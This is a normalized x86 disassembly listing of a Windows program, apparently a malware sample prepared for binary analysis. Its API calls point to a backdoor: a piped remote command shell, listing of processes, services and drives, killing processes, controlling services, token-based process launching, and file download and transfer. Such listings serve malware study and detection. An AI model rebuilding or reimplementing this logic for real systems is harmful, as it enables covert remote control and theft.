push [ ebp - 0x1c ]
lea eax [ ebp - 0x60 ]
push eax
push [ ebp + 0xc ]
call sub_402d31
add esp 0xc
mov [ rw-data ] eax
inc eax
lea ecx [ eax + 0x3 ]
cmp ecx [ ebp - 0x14 ]
jb r-xdata
cmp [ eax + esi + 0x1 ] 0xa
jne r-xdata
jmp r-xdata
cmp [ eax + esi + 0x2 ] 0xd
jne r-xdata
cmp [ eax + esi + 0x3 ] 0xa
je r-xdata
mov ecx [ ebp - 0x6c ]
lea edx [ eax + 0x4 ]
cmp edx ecx
je r-xdata
and [ ecx + esi ] 0x0
lea esi [ esi + eax + 0x4 ]
mov [ ebp + 0x14 ] esi
sub_402146
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push esi
call strlen
test eax eax
pop ecx
je r-xdata
push esi
call strlen
pop ecx
and [ ebp + 0x8 ] 0x0
lea ecx [ ebp + 0x8 ]
push 0x0
push ecx
push eax
push esi
push [ ebp + 0xc ]
call [ WriteFile@IAT ]
test eax eax
setne al
cmp [ ebp + 0x8 ] 0x0
je r-xdata
test al al
je r-xdata
push 0x64
call [ Sleep@IAT ]
sub_402192
push edi
mov edi [ esp + 0x8 ]
test edi edi
jne r-xdata
push esi
push edi
xor esi esi
call strlen
test eax eax
pop ecx
jbe r-xdata
xor eax eax
pop edi
retn
cmp [ esi + edi ] 0xd
jne r-xdata
mov cl [ esi + edi ]
test cl cl
je r-xdata
lea eax [ esi + edi ]
pop esi
pop edi
retn
and [ esi + edi ] 0x0
inc esi
inc esi
cmp cl 0xd
je r-xdata
cmp cl 0xa
je r-xdata
inc esi
cmp esi eax
jb r-xdata
sub_4021d5
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
xor esi esi
cmp eax esi
push edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
jne r-xdata
mov bl [ ebp + 0x10 ]
mov [ ebp + 0xc ] eax
push 0x8
mov edx rw-data
xor eax eax
pop ecx
cmp [ ebp + 0xc ] eax
mov edi edx
[ edi ]
jbe r-xdata
push [ ebp + 0x8 ]
call strlen
pop ecx
mov eax [ ebp - 0x8 ]
inc eax
mov edi [ ebp + 0x8 ]
mov cl [ esi + edi ]
lea eax [ esi + edi ]
cmp cl bl
je r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp cl 0xd
jne r-xdata
cmp cl 0x22
mov [ ebp - 0x4 ] 0x1
jne r-xdata
inc esi
cmp esi [ ebp + 0xc ]
jb r-xdata
and [ ebp - 0x4 ] 0x0
and [ eax ] 0x0
inc [ ebp - 0x8 ]
mov bl [ ebp + 0x10 ]
add edx 0x4
cmp edx rw-data
je r-xdata
lea eax [ esi + edi ]
mov [ edx ] eax
mov bl cl
inc esi
push 0x8
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_402272
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
xor ebx ebx
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
xor esi esi
mov [ ebp - 0xc ] ebx
push [ rw-data ]
mov esi [ CloseHandle@IAT ]
mov [ rw-data ] ebx
call esi
push [ rw-data ]
call esi
push 0x10
push ebx
push rw-data
call memset
push rw-data
push edi
call strcpy
push edi
call strlen
add esp 0x18
mov esi eax
push ebx
lea eax [ ebp - 0x4 ]
push ebx
push eax
mov eax 0x10000
sub eax esi
push eax
lea eax [ esi + edi ]
push eax
push [ ebp + 0x8 ]
call [ PeekNamedPipe@IAT ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
je r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ esi + edi ]
push [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0xa
jae r-xdata
add esi [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] ebx
mov [ ebp + 0x10 ] ebx
je r-xdata
push 0x32
call [ Sleep@IAT ]
inc [ ebp - 0xc ]
jmp r-xdata
jmp r-xdata
lea eax [ ebp + 0xc ]
push eax
push [ rw-data ]
call [ GetExitCodeProcess@IAT ]
cmp [ ebp + 0xc ] 0x103
jne r-xdata
sub_402350
push ebp
mov ebp esp
sub esp 0x26c
cmp [ ebp + 0xc ] 0xffffffff
push ebx
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov esi [ ebp + 0x10 ]
cmp esi 0xffffffff
je r-xdata
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call strcat
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x64 ]
push eax
push [ ebp + 0x8 ]
call strcat
add esp 0x1c
mov ebx 0x104
lea eax [ ebp - 0x16c ]
push ebx
push eax
push rw-data
call [ ExpandEnvironmentStringsA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x16c ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x16c ]
push ebx
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x16c ]
push rw-data
push eax
call strcat
pop ecx
pop ecx
push rw-data
push [ ebp + 0x8 ]
call strcat
lea eax [ ebp - 0x16c ]
push eax
push [ ebp + 0x8 ]
call strcat
push rw-data
push [ ebp + 0x8 ]
call strcat
push 0x44
lea eax [ ebp - 0x44 ]
pop ebx
push ebx
push edi
push eax
call memset
mov eax [ ebp + 0xc ]
add esp 0x24
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
cmp eax edi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x18 ] 0x101
mov [ ebp - 0x14 ] di
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] esi
je r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ ebp - 0x64 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x64 ]
push eax
push [ ebp + 0x8 ]
call strcat
add esp 0x14
jmp r-xdata
lea eax [ ebp - 0x44 ]
push rw-data
push eax
push edi
push edi
push edi
push 0x1
lea eax [ ebp - 0x16c ]
pop esi
push esi
push edi
push edi
push eax
push edi
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov [ rw-data ] esi
push eax
call [ atol@IAT ]
cmp eax edi
pop ecx
je r-xdata
push rw-data
jmp r-xdata
push rw-data
push eax
push edi
push 0x1f0fff
call [ OpenProcess@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
jmp r-xdata
lea eax [ ebp + 0x10 ]
push eax
push 0xb
push ebx
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ ebp - 0x26c ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x26c ]
push eax
push [ ebp + 0x8 ]
call strcat
add esp 0x14
jmp r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ ebp - 0x26c ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x26c ]
push eax
push [ ebp + 0x8 ]
call strcat
add esp 0x14
lea eax [ ebp - 0x44 ]
push rw-data
push eax
push edi
push edi
push edi
push 0x1
lea eax [ ebp - 0x16c ]
pop esi
push esi
push edi
push edi
push eax
push edi
push [ ebp + 0x10 ]
call [ CreateProcessAsUserA@IAT ]
test eax eax
je r-xdata
push ebx
call [ CloseHandle@IAT ]
jmp r-xdata
mov [ rw-data ] esi
jmp r-xdata
sub_4025b9
push ebp
mov ebp esp
sub esp 0x464
mov eax [ rw-data ]
push ebx
xor ebx ebx
push esi
cmp eax ebx
push edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov esi [ _strcmpi@IAT ]
push eax
push rw-data
call esi
pop ecx
test eax eax
pop ecx
jne r-xdata
push [ rw-data ]
push rw-data
call esi
pop ecx
test eax eax
pop ecx
jne r-xdata
mov edi 0x128
lea eax [ ebp - 0x240 ]
push edi
push ebx
push eax
call memset
mov esi 0x224
lea eax [ ebp - 0x464 ]
push esi
push ebx
push eax
call memset
add esp 0x18
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push [ rw-data ]
push rw-data
call esi
pop ecx
test eax eax
pop ecx
jne r-xdata
push 0x4
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
lea eax [ ebp - 0x240 ]
mov [ ebp - 0x240 ] edi
push eax
push ebx
mov [ ebp - 0x464 ] esi
call Process32First
push rw-data
jmp r-xdata
mov [ ebp - 0xc ] ebx
call [ GetLogicalDrives@IAT ]
mov esi [ sprintf@IAT ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x118 ]
push rw-data
push eax
mov [ ebp - 0x1 ] 0x41
call esi
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x118 ]
push eax
push edi
call strcat
add esp 0x10
push rw-data
push ebx
lea ecx [ ebp - 0x8 ]
push ebx
push ecx
lea ecx [ ebp - 0x18 ]
mov esi [ EnumServicesStatusExA@IAT ]
push ecx
push ebx
push ebx
push 0x1
push 0x30
push ebx
push eax
call esi
mov eax [ ebp - 0x18 ]
lea edi [ eax + 0x1 ]
push edi
call ??2@YAPAXI@Z
cmp eax ebx
pop ecx
mov [ ebp - 0x10 ] eax
jne r-xdata
push ebx
call [ CloseHandle@IAT ]
jmp r-xdata
push [ ebp - 0x238 ]
lea eax [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x118 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x118 ]
push eax
push [ ebp + 0x8 ]
call strcat
add esp 0x18
lea eax [ ebp - 0x240 ]
push eax
push ebx
call Process32Next
jmp r-xdata
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x118 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x118 ]
push eax
push edi
call strcat
add esp 0x14
test [ ebp - 0x8 ] 0x1
je r-xdata
push ebx
lea ecx [ ebp - 0x8 ]
push ebx
push ecx
lea ecx [ ebp - 0x18 ]
push ecx
push edi
push eax
push 0x1
push 0x30
push ebx
push [ ebp - 0xc ]
call esi
cmp [ ebp - 0x8 ] ebx
jbe r-xdata
push [ ebp - 0xc ]
call [ CloseServiceHandle@IAT ]
test eax eax
je r-xdata
shr [ ebp - 0x8 ] 0x1
inc [ ebp - 0x1 ]
jmp r-xdata
movsx eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x118 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x118 ]
push eax
push edi
call strcat
mov al [ ebp - 0x1 ]
add esp 0x14
mov [ ebp - 0x14 ] al
lea eax [ ebp - 0x14 ]
push rw-data
push eax
mov [ ebp - 0x13 ] bl
call [ lstrcatA@IAT ]
lea eax [ ebp - 0x14 ]
push eax
call [ GetDriveTypeA@IAT ]
sub eax ebx
je r-xdata
push [ ebp - 0x10 ]
call ??3@YAXPAX@Z
pop ecx
push [ ebp - 0xc ]
call [ CloseServiceHandle@IAT ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
cmp [ ebp - 0x8 ] ebx
je r-xdata
push rw-data
dec eax
je r-xdata
push [ esi + 0x4 ]
lea eax [ ebp - 0x118 ]
push [ esi ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x118 ]
push eax
push [ ebp + 0x8 ]
call strcat
add esp 0x18
inc ebx
add esi 0x2c
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push rw-data
push edi
call strcat
inc [ ebp - 0xc ]
pop ecx
pop ecx
lea eax [ ebp - 0x220 ]
push eax
push edi
call strcat
pop ecx
pop ecx
push rw-data
jmp r-xdata
dec eax
je r-xdata
push edi
call strcat
pop ecx
pop ecx
push rw-data
jmp r-xdata
dec eax
je r-xdata
push rw-data
jmp r-xdata
dec eax
je r-xdata
push rw-data
jmp r-xdata
dec eax
je r-xdata
push rw-data
jmp r-xdata
dec eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x220 ]
push 0x105
push eax
lea eax [ ebp - 0x14 ]
push eax
call [ GetVolumeInformationA@IAT ]
test eax eax
je r-xdata
push rw-data
jmp r-xdata
sub_4028d3
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ rw-data ]
mov esi [ _strcmpi@IAT ]
push rw-data
call esi
pop ecx
test eax eax
pop ecx
jne r-xdata
push [ rw-data ]
push rw-data
call esi
pop ecx
test eax eax
pop ecx
jne r-xdata
push [ rw-data ]
call [ atoi@IAT ]
pop ecx
push eax
push ebx
push 0x1f0fff
call [ OpenProcess@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push 0x4
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x4 ] ebx
je r-xdata
push 0x1
push esi
call [ TerminateProcess@IAT ]
push esi
mov [ ebp - 0x4 ] eax
call [ CloseHandle@IAT ]
push 0xf003f
push [ rw-data ]
push edi
call [ OpenServiceA@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
push rw-data
lea eax [ ebp - 0x20 ]
push eax
push 0x1
push esi
call [ ControlService@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x424
jne r-xdata
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x426
jne r-xdata
mov eax [ ebp - 0x1c ]
dec eax
je r-xdata
push rw-data
push rw-data
jmp r-xdata
push rw-data
push rw-data
jmp r-xdata
push rw-data
jmp r-xdata
dec eax
dec eax
je r-xdata
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
push edi
call [ CloseServiceHandle@IAT ]
jmp r-xdata
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
push rw-data
jmp r-xdata
dec eax
jne r-xdata
push esi
mov esi [ CloseServiceHandle@IAT ]
call esi
push edi
call esi
push rw-data
jmp r-xdata
sub_402a30
mov eax sub_4033e4
call sub_403210
sub esp 0x288
push ebx
push esi
push edi
push 0xea60
push 0x1
mov eax rw-data
pop edi
xor ebx ebx
push edi
push eax
push eax
push rw-data
push eax
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x1c ] ebx
call sub_40116c
cmp [ rw-data ] ebx
mov [ ebp - 0x4 ] ebx
jne r-xdata
push 0x200c8
call ??2@YAPAXI@Z
mov esi eax
pop ecx
cmp esi ebx
mov [ ebp - 0x20 ] esi
mov [ esi ] bl
je r-xdata
xor esi esi
jmp r-xdata
cmp [ ebp - 0x18 ] 0xffffffff
je r-xdata
push rw-data
push [ rw-data ]
call [ _strcmpi@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x50 ]
call sub_4011c8
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push 0x1
pop esi
push [ ebp - 0x18 ]
call [ CloseHandle@IAT ]
push [ rw-data ]
lea eax [ ebp - 0x194 ]
push eax
call strcpy
cmp [ ebp - 0x1c ] ebx
pop ecx
pop ecx
je r-xdata
mov [ ebp - 0x1c ] edi
push ebx
push 0x80
push 0x3
push ebx
push edi
push 0x80000000
push 0x5c
push [ rw-data ]
call [ strrchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push ebx
push 0x80
push 0x2
push ebx
push edi
push 0x40000000
jmp r-xdata
inc eax
push eax
lea eax [ ebp - 0x194 ]
push eax
call strcpy
pop ecx
pop ecx
push esi
call ??3@YAXPAX@Z
pop ecx
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x18 ]
call [ GetFileSize@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push [ rw-data ]
call [ atoi@IAT ]
pop ecx
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x194 ]
push eax
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x18 ] eax
je r-xdata
cmp [ ebp - 0x28 ] ebx
jne r-xdata
lea eax [ ebp - 0x294 ]
push eax
push rw-data
push [ rw-data ]
call [ sscanf@IAT ]
add esp 0xc
lea ecx [ ebp - 0x50 ]
push [ rw-data ]
call sub_40133a
lea eax [ ebp - 0x294 ]
lea ecx [ ebp - 0x50 ]
push eax
call sub_40137f
cmp [ ebp - 0x1c ] ebx
jne r-xdata
push edi
lea eax [ ebp - 0x90 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea ecx [ ebp - 0x50 ]
call sub_401210
test eax eax
je r-xdata
lea eax [ ebp - 0x90 ]
lea ecx [ ebp - 0x50 ]
push eax
call sub_401421
mov [ ebp - 0x14 ] edi
lea ecx [ ebp - 0x50 ]
call sub_401a09
cmp [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov edi 0x20000
jne r-xdata
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x50 ]
push esi
call sub_401466
cmp eax ebx
mov [ ebp - 0x24 ] eax
je r-xdata
cmp [ ebp - 0x14 ] edi
mov eax edi
jg r-xdata
cmp [ ebp - 0x14 ] ebx
jle r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x10 ]
push ebx
push ecx
push eax
push esi
push [ ebp - 0x18 ]
call [ ReadFile@IAT ]
mov eax [ ebp - 0x14 ]
cmp [ ebp - 0x24 ] ebx
je r-xdata
cmp [ ebp - 0x14 ] edi
jg r-xdata
jmp r-xdata
lea eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x50 ]
push eax
push edi
push esi
call sub_4019cc
push rw-data
push esi
mov [ ebp - 0x24 ] eax
call [ strstr@IAT ]
pop ecx
cmp eax ebx
pop ecx
jne r-xdata
mov edi [ ebp - 0x14 ]
lea ecx [ ebp - 0x50 ]
call sub_401a09
lea ecx [ ebp - 0x50 ]
call sub_401210
cmp eax ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x10 ] 0x3
jbe r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
cmp [ esi + eax ] 0xd
jne r-xdata
sub [ ebp - 0x14 ] edi
cmp [ ebp - 0x10 ] ebx
mov [ ebp - 0x20 ] esi
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
push edi
push [ ebp - 0x20 ]
push [ ebp - 0x18 ]
call [ WriteFile@IAT ]
inc eax
lea ecx [ eax + 0x3 ]
cmp ecx [ ebp - 0x10 ]
jb r-xdata
cmp [ eax + esi + 0x1 ] 0xa
jne r-xdata
cmp [ ebp - 0x24 ] ebx
jne r-xdata
jmp r-xdata
cmp [ eax + esi + 0x2 ] 0xd
jne r-xdata
cmp [ eax + esi + 0x3 ] 0xa
je r-xdata
lea ecx [ eax + 0x4 ]
cmp ecx [ ebp - 0x10 ]
jne r-xdata
mov ecx [ ebp - 0x10 ]
push 0xfffffffc
mov [ ecx + esi ] bl
pop ecx
sub ecx eax
lea eax [ eax + esi + 0x4 ]
add [ ebp - 0x10 ] ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x10 ] ebx
jmp r-xdata
sub_402d31
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
je r-xdata
push rw-data
push esi
call strcat
push esi
call strlen
mov edi [ ebp + 0xc ]
add esp 0xc
mov ecx edi
mov [ ebp + 0x8 ] eax
call sub_401a09
push rw-data
push esi
call strcat
push [ ebp + 0x10 ]
push rw-data
call sub_402146
add esp 0x10
push 0xffffffff
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push rw-data
push esi
mov [ rw-data ] ebx
call strcat
pop ecx
pop ecx
push [ ebp + 0x8 ]
mov ecx edi
push esi
call sub_401466
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx edi
call sub_401a09
push 0xea60
inc ebx
call [ Sleep@IAT ]
cmp ebx 0x5
jb r-xdata
mov ecx edi
call sub_401210
test eax eax
jne r-xdata
sub_402dd4
push ebp
mov ebp esp
sub esp 0x54
push ebx
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ rw-data ]
mov edi [ _strcmpi@IAT ]
push rw-data
call edi
pop ecx
test eax eax
pop ecx
jne r-xdata
push [ rw-data ]
push rw-data
call edi
pop ecx
test eax eax
pop ecx
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
pop edi
push edi
push esi
push eax
call memset
add esp 0xc
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x24 ] si
push 0x1
pop eax
push ecx
lea ecx [ ebp - 0x54 ]
push ecx
push esi
push esi
push esi
push eax
push esi
push esi
mov [ ebp - 0x28 ] eax
push [ rw-data ]
push esi
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
push 0x4
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov ebx eax
cmp ebx esi
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push 0xf003f
push [ rw-data ]
push ebx
call [ OpenServiceA@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
jmp r-xdata
call esi
push [ ebp + 0x8 ]
call strcat
mov esi [ CloseHandle@IAT ]
pop ecx
pop ecx
push [ ebp - 0x10 ]
call esi
push [ ebp - 0xc ]
jmp r-xdata
push esi
push esi
push edi
call [ StartServiceA@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x424
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x420
jne r-xdata
push rw-data
jmp r-xdata
push rw-data
push rw-data
jmp r-xdata
push rw-data
push rw-data
jmp r-xdata
push [ ebp + 0x8 ]
call strcat
mov esi [ CloseServiceHandle@IAT ]
pop ecx
pop ecx
push edi
call esi
push ebx
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
push ebx
call [ CloseServiceHandle@IAT ]
jmp r-xdata
sub_402f31
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push eax
call [ atol@IAT ]
push eax
push [ rw-data ]
push [ esp + 0x10 ]
call sub_402f7e
add esp 0x10
sub_402f5e
mov ecx [ rw-data ]
xor edx edx
cmp ecx edx
je r-xdata
retn
mov eax [ rw-data ]
cmp eax edx
je r-xdata
push edx
push edx
push eax
push ecx
push edx
call URLDownloadToFileA
sub_402f7e
push ebp
mov ebp esp
sub esp 0x260
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
jne r-xdata
push [ ebp + 0x10 ]
push edi
push 0x1f0fff
call [ OpenProcess@IAT ]
call [ GetCurrentProcess@IAT ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push esi
push eax
push 0xb
push [ ebp + 0x10 ]
call [ OpenProcessToken@IAT ]
mov esi [ CloseHandle@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ ebp - 0x15c ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x15c ]
push eax
push [ ebp + 0x8 ]
call strcat
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax 0xffffffff
mov [ ebp + 0x10 ] eax
jne r-xdata
call [ GetLastError@IAT ]
push eax
lea eax [ ebp - 0x15c ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x15c ]
push eax
push [ ebp + 0x8 ]
call strcat
add esp 0x14
push ebx
push 0x44
pop ebx
lea eax [ ebp - 0x5c ]
push ebx
push edi
push eax
call memset
push [ ebp + 0xc ]
lea eax [ ebp - 0x260 ]
mov [ ebp - 0x5c ] ebx
mov ebx [ sprintf@IAT ]
push rw-data
push eax
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x2c ] di
call ebx
add esp 0x18
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
push edi
push edi
push edi
push 0x1
push edi
lea eax [ ebp - 0x260 ]
push edi
push eax
push edi
push [ ebp - 0x4 ]
call [ CreateProcessAsUserA@IAT ]
test eax eax
je r-xdata
pop edi
leave
retn
call [ GetLastError@IAT ]
push eax
lea eax [ ebp - 0x15c ]
push rw-data
push eax
call ebx
lea eax [ ebp - 0x15c ]
push eax
push [ ebp + 0x8 ]
call strcat
add esp 0x14
push rw-data
push [ ebp + 0x8 ]
call strcat
pop ecx
pop ecx
push [ ebp - 0x18 ]
call esi
push [ ebp - 0x14 ]
call esi
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
push [ ebp + 0x10 ]
call esi
mov eax [ ebp - 0x8 ]
pop esi
push [ ebp - 0x4 ]
call esi
pop ebx
jmp r-xdata
sub_4030e4
push ebp
mov ebp esp
sub esp 0x28
push ebx
push esi
push edi
push rw-data
xor ebx ebx
push 0x1
push ebx
call [ CreateMutexA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov esi rw-data
push esi
call strlen
mov [ ebp - 0x4 ] eax
inc eax
push eax
call ??2@YAPAXI@Z
mov edi eax
pop ecx
cmp edi ebx
pop ecx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
mov eax [ ebp - 0x4 ]
inc eax
push eax
push ebx
push edi
call memset
push esi
push edi
call strcpy
push edi
call sub_40109b
add esp 0x18
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0x23
mov [ ebp - 0x28 ] 0x2f
push eax
lea eax [ ebp - 0x27 ]
push eax
call [ GetComputerNameA@IAT ]
test eax eax
jne r-xdata
push 0x1
pop eax
jmp r-xdata
xor eax eax
lea eax [ ebp - 0x28 ]
push rw-data
push eax
call strcat
pop ecx
pop ecx
mov [ ebp - 0x28 ] bl
pop edi
pop esi
pop ebx
leave
retn 0x10
lea eax [ ebp - 0x28 ]
push 0x1
push eax
push rw-data
push edi
call sub_401a43
add esp 0x10
cmp [ rw-data ] ebx
jne r-xdata
mov eax [ rw-data ]
imul eax eax 0xea60
push eax
call [ Sleep@IAT ]
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4033af
cmp [ rw-data ] ebx
jne r-xdata
call sub_40339a
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4033ac
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4030e4
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401150
push esi
mov esi ecx
call sub_4011c8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
